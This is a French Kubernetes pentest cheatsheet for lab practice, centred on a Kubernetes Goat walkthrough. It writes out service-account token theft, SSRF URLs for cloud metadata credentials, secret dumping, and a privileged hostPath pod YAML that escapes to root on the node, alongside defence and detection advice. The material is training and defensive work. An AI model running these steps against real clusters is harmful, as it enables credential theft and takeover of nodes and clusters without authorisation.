# Kubernetes — cheatsheet

Pentest de cluster : surface d'API, RBAC, tokens de service-account, secrets, pods privilégiés, évasion vers le nœud. Prolonge [`linux-privesc`](linux-privesc.md) (l'évasion de conteneur retombe sur du Linux) et [`nmap`](nmap.md).

> ⚠️ **Rappel légal.** Uniquement sur ton **lab auto-hébergé** (Kubernetes Goat, Bust-a-Kube, cluster kind/minikube perso) ou plateformes autorisées (CloudGoat, Academy HTB). Hors cadre contractuel écrit → infraction, **art. 323-1**.

**Plan** : surface → commandes → **déroulé guidé Kubernetes Goat** → recettes → côté défense → à savoir expliquer à l'oral.

---

## 1. Surface d'attaque

| Composant | Port | Risque type |
| --- | --- | --- |
| **API server** | 6443 | exposition, auth anonyme, RBAC trop large |
| **kubelet** | 10250 | endpoints exposés → exec dans les pods |
| **etcd** | 2379 | secrets/état du cluster en clair si non chiffré |
| **Service-account token** | — | monté par défaut dans chaque pod (`/var/run/secrets/...`) |
| **Pod privilégié / hostPath / hostPID** | — | évasion vers le nœud hôte |
| **Secrets** | — | base64 ≠ chiffré ; RBAC de lecture souvent trop large |
| **Metadata cloud** | 169.254.169.254 | SSRF depuis un pod → creds du nœud |

Vocabulaire de rebond : **pod** (unité de conteneur(s)) → **node** (la VM qui l'héberge) → **namespace** (cloisonnement logique) → **cluster** (l'ensemble). L'objectif d'un test, c'est de remonter cette chaîne : pod → node → cluster.

---

## 2. Commandes — découverte & énumération

```bash
# Recon externe (lab)
kube-hunter --remote <ip>                     # découverte de surface
nmap -p 6443,10250,2379,8443 <ip>

# Depuis un pod compromis — le token monté par défaut
cat /var/run/secrets/kubernetes.io/serviceaccount/token
cat /var/run/secrets/kubernetes.io/serviceaccount/namespace
cat /var/run/secrets/kubernetes.io/serviceaccount/ca.crt
env | grep KUBERNETES                          # adresse de l'API server

# La question centrale : que me permet ce token ?
kubectl auth can-i --list
kubectl auth can-i create pods
kubectl auth can-i get secrets
kubectl get pods,secrets,nodes -A 2>/dev/null

# Posture de sécurité (outils aussi utiles côté Blue)
kube-bench                                      # CIS benchmark cluster
kubescape scan
trivy image <image>                            # vulns des images
```

Astuce : si `kubectl` n'est pas dans le pod, on parle à l'API en direct avec `curl` + le token :
```bash
APISERVER=https://kubernetes.default.svc
TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
curl -sk -H "Authorization: Bearer $TOKEN" $APISERVER/api/v1/namespaces/default/pods
```

---

## 3. Déroulé guidé — Kubernetes Goat

**Kubernetes Goat** (madhuakula/kubernetes-goat) = cluster volontairement vulnérable, ~20 scénarios. C'est le « GOAD du K8s » et le **livrable de la phase 8**. Ci-dessous une chaîne cohérente **recon → foothold → RBAC → secrets → évasion vers le nœud → latéral**, à documenter dans une note machine (`machines/KubernetesGoat.md` à partir du template).

### 3.0 — Mise en place (lab local)

```bash
git clone https://github.com/madhuakula/kubernetes-goat.git
cd kubernetes-goat
# Cluster local jetable (kind) ou minikube, puis :
bash setup-kubernetes-goat.sh
bash access-kubernetes-goat.sh        # expose les scénarios en local (port-forward)
```
> Environnement **jetable** : on casse, on `kind delete cluster`, on recommence. Rien d'exposé sur Internet.

### 3.1 — Reconnaissance & « Gaining environment info »

Premier réflexe une fois dans un conteneur du scénario : cartographier où on est.
```bash
id ; hostname ; cat /etc/os-release
mount | grep -i secret                          # token SA monté ?
env                                             # variables, parfois des creds
cat /var/run/secrets/kubernetes.io/serviceaccount/namespace
```
**Ce qu'on observe** : on est dans un pod, un token de service-account est monté, l'API server est joignable via `kubernetes.default.svc`.
**Pourquoi ça compte** : ce token *est* notre identité dans le cluster — tout part de là.

### 3.2 — Secrets en clair (« Sensitive keys in codebases »)

Beaucoup de scénarios cachent des creds dans l'app, l'historique git, ou les variables d'env.
```bash
env | grep -iE 'key|token|pass|secret'
find / -name '*.env' 2>/dev/null
# si un dépôt git est présent dans l'image :
git -C /app log -p 2>/dev/null | grep -iE 'key|secret'
```
**Leçon** : base64/env/git ≠ coffre-fort. Un secret lisible est un secret exposé.

### 3.3 — SSRF → metadata (« SSRF in the Kubernetes world »)

Un service vulnérable au SSRF permet d'atteindre l'endpoint metadata du nœud/cloud.
```
# via le champ vulnérable de l'app du scénario :
http://169.254.169.254/latest/meta-data/
http://169.254.169.254/latest/meta-data/iam/security-credentials/
```
**Pourquoi ça marche** : le pod hérite du réseau du nœud ; l'endpoint metadata n'exige pas d'auth. On peut récupérer des creds cloud du nœud → sortie du périmètre K8s.
**Remédiation à noter** : bloquer 169.254.169.254 depuis les pods (NetworkPolicy / IMDSv2).

### 3.4 — RBAC : ce que le token permet (« RBAC least privileges misconfiguration »)

```bash
kubectl auth can-i --list                       # LE réflexe
kubectl auth can-i create pods
kubectl auth can-i get secrets -n default
```
**Scénario typique** : le service-account du pod a le droit de **lister/lire les secrets** ou de **créer des pods** — droits disproportionnés.
```bash
kubectl get secrets -A
kubectl get secret <nom> -o jsonpath='{.data}' ; echo
# puis décoder :
echo '<valeur_base64>' | base64 -d
```
On récupère souvent des creds vers une **BDD**, un **registry** privé, ou un autre service → rebond.

### 3.5 — Registry privé & « Hidden in layers »

Avec des creds de registry, on tire des images et on inspecte leurs **couches** (des secrets traînent dans l'historique de build) :
```bash
trivy image <registry>/<image>:<tag>
# inspection manuelle des couches
docker history --no-trunc <image>
```

### 3.6 — Évasion vers le nœud (« Container escape to the host system »)

Le cœur du sujet. Si le RBAC autorise la **création d'un pod privilégié**, on monte le système de fichiers du nœud et on sort du conteneur.
```yaml
# escape-pod.yaml  (lab uniquement)
apiVersion: v1
kind: Pod
metadata: { name: escape }
spec:
  hostPID: true
  containers:
  - name: escape
    image: alpine
    securityContext: { privileged: true }      # <-- le point faible
    command: ["/bin/sh","-c","sleep 1d"]
    volumeMounts:
    - { name: host, mountPath: /host }
  volumes:
  - name: host
    hostPath: { path: / }                        # monte la racine du NŒUD
```
```bash
kubectl apply -f escape-pod.yaml
kubectl exec -it escape -- chroot /host bash     # on est root SUR LE NŒUD
```
**Pourquoi ça marche** : `privileged: true` + `hostPath: /` = le conteneur voit le disque du nœud avec les droits root → équivalent K8s d'une privesc SUID. Depuis le nœud, on lit les kubeconfig/kubelet, les tokens des autres pods, etc.
**Variante DIND** : socket Docker exposé (`/var/run/docker.sock` monté) → `docker run` privilégié = même résultat.

### 3.7 — Latéral & « namespaces bypass »

Le cloisonnement par namespace est **logique**, pas une frontière de sécurité réseau par défaut.
```bash
kubectl get pods -A                              # voir les autres namespaces
# depuis le nœud (3.6) : lire les tokens des pods d'autres namespaces
ls /host/var/lib/kubelet/pods/*/volumes/kubernetes.io~projected/*/token
```
De là, on rejoue 3.4 avec un token plus privilégié → on remonte vers un service-account qui peut tout, souvent jusqu'à l'annuaire ou la BDD applicative.

### 3.8 — Le livrable

Dans `machines/KubernetesGoat.md` : **schéma pod → node → cluster**, chaque étape avec *commande → observation → pourquoi ça marche → trace/détection → remédiation*. C'est ce format qui fait la valeur du profil en entretien.

---

## 4. Recettes (résumé mémo)

| Objectif | Point d'entrée | Réflexe |
| --- | --- | --- |
| Savoir ce qu'on peut faire | token SA monté | `kubectl auth can-i --list` |
| Récupérer des creds | secrets / env / metadata | `get secret -o jsonpath` + base64 -d |
| Sortir du conteneur | droit `create pod` privilégié | pod `privileged` + `hostPath: /` → `chroot` |
| Rebondir | socket Docker, registry | `docker.sock`, `trivy image` |
| Bouger latéralement | namespaces, tokens du nœud | relire les tokens depuis l'hôte |

---

## 5. Côté défense / détection

| Attaque | Contrôle / trace |
| --- | --- |
| Token SA abusé | audit log API server (`verb`, `user`, `sourceIP`) |
| Pod privilégié créé | **Pod Security Admission** (`restricted`) le refuse ; alerte sur `securityContext.privileged` |
| Évasion conteneur | **Falco** (règle « Terminal shell in container », montage sensible) |
| Lecture de secrets | audit log `get secret` ; RBAC au moindre privilège |
| SSRF metadata | NetworkPolicy bloquant 169.254.169.254 ; IMDSv2 |
| kubelet exposé | `--anonymous-auth=false`, NetworkPolicy |
| Images vulnérables | Trivy en CI, admission control (signature) |

Outils Blue à connaître (présents dans Goat) : **Falco** (runtime), **kube-bench** (CIS), **kubeaudit**, **Popeye** (sanitizer). Durcissement : RBAC minimal, `automountServiceAccountToken: false` par défaut, Pod Security Admission `restricted`, NetworkPolicies entre namespaces, etcd chiffré au repos, audit logging activé.

---

## 6. À savoir expliquer à l'oral

- « La question n°1 dans un cluster, c'est **le RBAC** : `kubectl auth can-i --list` avant tout le reste. »
- Pourquoi un **pod privilégié = compromission du nœud** (puis du cluster de proche en proche via les tokens des autres pods).
- base64 n'est **pas** du chiffrement : un secret K8s lisible est un secret exposé.
- Un **namespace n'est pas une frontière de sécurité** par défaut — il faut des NetworkPolicies.
- Le lien avec le reste : un secret K8s contient souvent les creds qui mènent à l'annuaire ou à la BDD → K8s est un **tremplin**, pas une fin.
- Réflexe défensif en une phrase : Pod Security Admission `restricted` + `automountServiceAccountToken: false` + Falco.
